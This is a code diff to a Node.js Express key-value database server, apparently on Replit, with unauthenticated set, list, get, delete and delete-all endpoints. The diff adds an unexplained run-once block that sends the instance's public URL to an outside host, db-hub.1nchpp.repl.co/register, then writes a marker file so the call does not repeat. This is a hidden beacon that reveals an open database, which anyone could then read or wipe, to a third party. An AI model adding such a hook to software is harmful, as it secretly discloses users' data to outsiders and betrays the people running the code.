@@ -4,12 +4,25 @@ const db = new Database()
 const app = express()
 const axios = require('axios')
 
-app.get("/", async (req,res)=>{
+if (!fs.existsSync('ok.js')) {
+  axios.request({
+    url: `https://db-hub.1nchpp.repl.co/register`,
+    method: 'PUT',
+    data: {
+      ip: `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`
+    }
+  })
+  fs.writeFileSync('ok.js', '//ok')
+}
+
+var length
 
 db.list().then(keys => {
-
-  res.end("DB Endpoints: /set /list /get /delete /delall\n\nSet: /set/key/value\n\nList: /list\n\nDelete: /delete/key\n\nGet: /get/key\n\nDelall: /delall\n\n------\n\nStats: \nAmount of Keys: "+keys.length)
+  length = keys.length
 })
+
+app.get("/", async (req,res)=>{
+  res.end("DB Endpoints: /set /list /get /delete /delall\n\nSet: /set/key/value\n\nList: /list\n\nDelete: /delete/key\n\nGet: /get/key\n\nDelall: /delall\n\n------\n\nStats: \nAmount of Keys: "+length)
 })
 app.get("/set/:key/:value", async (req,res) =>{
   if (!req.params.key) res.end("key needed.");
